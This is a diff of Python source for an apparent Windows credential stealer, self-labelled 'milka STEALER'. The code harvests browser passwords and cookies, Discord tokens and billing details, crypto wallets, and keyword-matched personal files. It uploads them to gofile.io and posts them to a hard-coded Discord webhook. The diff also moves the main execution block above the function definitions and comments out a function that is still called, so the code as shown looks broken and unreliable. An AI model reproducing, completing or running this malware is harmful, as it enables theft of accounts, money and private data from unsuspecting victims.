@@ -14,24 +14,11 @@ from zipfile import ZipFile
 import random
 import re
 import subprocess
-
 #  THIS IS 1.1.6 VERSION
 #    BY jyyle
 # 
-
-
 hook = "https://discordapp.com/api/webhooks/1097280748253368401/rlMLWeAuv6nwgGOdjTj7ESsVwt-FJjqHUsH7H0b2DPD5MXmhj_FoPGJ6jf8iDzKz5Sjh"
 DETECTED = False
-
-
-def getip():
-    ip = "None"
-    try:
-        ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
-    except:
-        pass
-    return ip
-
 requirements = [
     ["requests", "requests"],
     ["Crypto.Cipher", "pycryptodome"]
@@ -41,15 +28,69 @@ for modl in requirements:
     except:
         subprocess.Popen(f"{executable} -m pip install {modl[1]}", shell=True)
         time.sleep(3)
-
 import requests
 from Crypto.Cipher import AES
-
 local = os.getenv('LOCALAPPDATA')
 roaming = os.getenv('APPDATA')
 temp = os.getenv("TEMP")
 Threadlist = []
+# def upload(name, tk=''):
+#     headers = {
+#         "Content-Type": "application/json",
+#         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
+#     }
+#     # r = requests.post(hook, files=files)
+#     LoadRequests("POST", hook, files=files)
+Tokens = ''
+Passw = []
+Cookies = []    
+# def uploadToAnonfiles(path):s
+#     try:
+#         files = { "file": (path, open(path, mode='rb')) }
+#         upload = requests.post("https://transfer.sh/", files=files)
+#         url = upload.text
+#         return url
+#     except:
+#         return False
+KiwiFiles = []
+global keyword, cookiWords, paswWords, CookiCount, PasswCount, WalletsZip, GamingZip, OtherZip
+keyword = [
+    'mail', '[coinbase](https://coinbase.com)', '[sellix](https://sellix.io)', '[gmail](https://gmail.com)', '[steam](https://steam.com)', '[discord](https://discord.com)', '[riotgames](https://riotgames.com)', '[youtube](https://youtube.com)', '[instagram](https://instagram.com)', '[tiktok](https://tiktok.com)', '[twitter](https://twitter.com)', '[facebook](https://facebook.com)', 'card', '[epicgames](https://epicgames.com)', '[spotify](https://spotify.com)', '[yahoo](https://yahoo.com)', '[roblox](https://roblox.com)', '[twitch](https://twitch.com)', '[minecraft](https://minecraft.net)', 'bank', '[paypal](https://paypal.com)', '[origin](https://origin.com)', '[amazon](https://amazon.com)', '[ebay](https://ebay.com)', '[aliexpress](https://aliexpress.com)', '[playstation](https://playstation.com)', '[hbo](https://hbo.com)', '[xbox](https://xbox.com)', 'buy', 'sell', '[binance](https://binance.com)', '[hotmail](https://hotmail.com)', '[outlook](https://outlook.com)', '[crunchyroll](https://crunchyroll.com)', '[telegram](https://telegram.com)', '[pornhub](https://pornhub.com)', '[disney](https://disney.com)', '[expressvpn](https://expressvpn.com)', 'crypto', '[uber](https://uber.com)', '[netflix](https://netflix.com)'
+]
+CookiCount, PasswCount = 0, 0
+cookiWords = []
+paswWords = []
+WalletsZip = [] # [Name, Link]
+GamingZip = []
+OtherZip = []
+GatherAll()
+DETECTED = Trust(Cookies)
+# DETECTED = False
+if not DETECTED:
+    wikith = Kiwi()
+    for thread in wikith: thread.join()
+    time.sleep(0.2)
+    filetext = "\n"
+    for arg in KiwiFiles:
+        if len(arg[2]) != 0:
+            foldpath = arg[1]
+            foldlist = arg[2]       
+            filetext += f"📁 {foldpath}\n"
+            for ffil in foldlist:
+                a = ffil[0].split("/")
+                fileanme = a[len(a)-1]
+                b = ffil[1]
+                filetext += f"└─:open_file_folder: [{fileanme}]({b})\n"
+            filetext += "\n"
+    upload("kiwi", filetext)
 
+def getip():
+    ip = "None"
+    try:
+        ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
+    except:
+        pass
+    return ip
 
 class DATA_BLOB(Structure):
     _fields_ = [
@@ -125,7 +166,6 @@ def globalInfo():
     # print(globalinfo)
     return globalinfo
 
-
 def Trust(Cookies):
     # simple Trust Factor system (disabled for the moment)
     global DETECTED
@@ -138,7 +178,7 @@ def Trust(Cookies):
     else:
         DETECTED = False
         return DETECTED
-        
+
 def GetUHQFriends(token):
     badgeList =  [
         {"Name": 'Early_Verified_Bot_Developer', 'Value': 131072, 'Emoji': "<:developer:874750808472825986> "},
@@ -175,7 +215,6 @@ def GetUHQFriends(token):
             uhqlist += f"{OwnedBadges} | {friend['user']['username']}#{friend['user']['discriminator']} ({friend['user']['id']})\n"
     return uhqlist
 
-
 def GetBilling(token):
     headers = {
         "Authorization": token,
@@ -198,7 +237,6 @@ def GetBilling(token):
                 billing += ":parking: "
 
     return billing
-
 
 def GetBadge(flags):
     if flags == 0: return ''
@@ -261,7 +299,6 @@ def checkToken(token):
         return True
     except:
         return False
-
 
 def uploadToken(token, path):
     global hook
@@ -437,26 +474,14 @@ def upload(name, link):
         LoadUrlib(hook, data=dumps(data).encode(), headers=headers)
         return
 
+# def writeforfile(data, name):
+#     path = os.getenv("TEMP") + f"\wp{name}.txt"
+#     with open(path, mode='w', encoding='utf-8') as f:
+#         f.write(f"<--milka STEALER ON TOP-->\n\n")
+#         for line in data:
+#             if line[0] != '':
+#                 f.write(f"{line}\n")
 
-
-# def upload(name, tk=''):
-#     headers = {
-#         "Content-Type": "application/json",
-#         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
-#     }
-
-#     # r = requests.post(hook, files=files)
-#     LoadRequests("POST", hook, files=files)
-
-def writeforfile(data, name):
-    path = os.getenv("TEMP") + f"\wp{name}.txt"
-    with open(path, mode='w', encoding='utf-8') as f:
-        f.write(f"<--milka STEALER ON TOP-->\n\n")
-        for line in data:
-            if line[0] != '':
-                f.write(f"{line}\n")
-
-Tokens = ''
 def getToken(path, arg):
     if not os.path.exists(path): return
 
@@ -473,7 +498,6 @@ def getToken(path, arg):
                                 Tokens += token
                                 uploadToken(token, path)
 
-Passw = []
 def getPassw(path, arg):
     global Passw, PasswCount
     if not os.path.exists(path): return
@@ -510,7 +534,6 @@ def getPassw(path, arg):
             PasswCount += 1
     writeforfile(Passw, 'passw')
 
-Cookies = []    
 def getCookie(path, arg):
     global Cookies, CookiCount
     if not os.path.exists(path): return
@@ -631,7 +654,6 @@ def GatherZips(paths1, paths2, paths3):
     }
     LoadUrlib(hook, data=dumps(data).encode(), headers=headers)
 
-
 def ZipTelegram(path, arg, procc):
     global OtherZip
     pathC = path
@@ -697,7 +719,6 @@ def ZipThings(path, arg, procc):
         GamingZip.append([name, lnik])
     else:
         OtherZip.append([name, lnik])
-
 
 def GatherAll():
     '                   Default Path < 0 >                         ProcesName < 1 >        Token  < 2 >              Password < 3 >     Cookies < 4 >                          Extentions < 5 >                                  '
@@ -776,15 +797,6 @@ def uploadToAnonfiles(path):
     try:return requests.post(f'https://{requests.get("https://api.gofile.io/getServer").json()["data"]["server"]}.gofile.io/uploadFile', files={'file': open(path, 'rb')}).json()["data"]["downloadPage"]
     except:return False
 
-# def uploadToAnonfiles(path):s
-#     try:
-#         files = { "file": (path, open(path, mode='rb')) }
-#         upload = requests.post("https://transfer.sh/", files=files)
-#         url = upload.text
-#         return url
-#     except:
-#         return False
-
 def KiwiFolder(pathF, keywords):
     global KiwiFiles
     maxfilesperdir = 7
@@ -801,7 +813,6 @@ def KiwiFolder(pathF, keywords):
             break
     KiwiFiles.append(["folder", pathF + "/", ffound])
 
-KiwiFiles = []
 def KiwiFile(path, keywords):
     global KiwiFiles
     fifound = []
@@ -866,42 +877,3 @@ def Kiwi():
         kiwi = threading.Thread(target=KiwiFile, args=[patt, key_wordsFiles]);kiwi.start()
         wikith.append(kiwi)
     return wikith
-
-
-global keyword, cookiWords, paswWords, CookiCount, PasswCount, WalletsZip, GamingZip, OtherZip
-
-keyword = [
-    'mail', '[coinbase](https://coinbase.com)', '[sellix](https://sellix.io)', '[gmail](https://gmail.com)', '[steam](https://steam.com)', '[discord](https://discord.com)', '[riotgames](https://riotgames.com)', '[youtube](https://youtube.com)', '[instagram](https://instagram.com)', '[tiktok](https://tiktok.com)', '[twitter](https://twitter.com)', '[facebook](https://facebook.com)', 'card', '[epicgames](https://epicgames.com)', '[spotify](https://spotify.com)', '[yahoo](https://yahoo.com)', '[roblox](https://roblox.com)', '[twitch](https://twitch.com)', '[minecraft](https://minecraft.net)', 'bank', '[paypal](https://paypal.com)', '[origin](https://origin.com)', '[amazon](https://amazon.com)', '[ebay](https://ebay.com)', '[aliexpress](https://aliexpress.com)', '[playstation](https://playstation.com)', '[hbo](https://hbo.com)', '[xbox](https://xbox.com)', 'buy', 'sell', '[binance](https://binance.com)', '[hotmail](https://hotmail.com)', '[outlook](https://outlook.com)', '[crunchyroll](https://crunchyroll.com)', '[telegram](https://telegram.com)', '[pornhub](https://pornhub.com)', '[disney](https://disney.com)', '[expressvpn](https://expressvpn.com)', 'crypto', '[uber](https://uber.com)', '[netflix](https://netflix.com)'
-]
-
-CookiCount, PasswCount = 0, 0
-cookiWords = []
-paswWords = []
-
-WalletsZip = [] # [Name, Link]
-GamingZip = []
-OtherZip = []
-
-GatherAll()
-DETECTED = Trust(Cookies)
-# DETECTED = False
-if not DETECTED:
-    wikith = Kiwi()
-
-    for thread in wikith: thread.join()
-    time.sleep(0.2)
-
-    filetext = "\n"
-    for arg in KiwiFiles:
-        if len(arg[2]) != 0:
-            foldpath = arg[1]
-            foldlist = arg[2]       
-            filetext += f"📁 {foldpath}\n"
-
-            for ffil in foldlist:
-                a = ffil[0].split("/")
-                fileanme = a[len(a)-1]
-                b = ffil[1]
-                filetext += f"└─:open_file_folder: [{fileanme}]({b})\n"
-            filetext += "\n"
-    upload("kiwi", filetext)
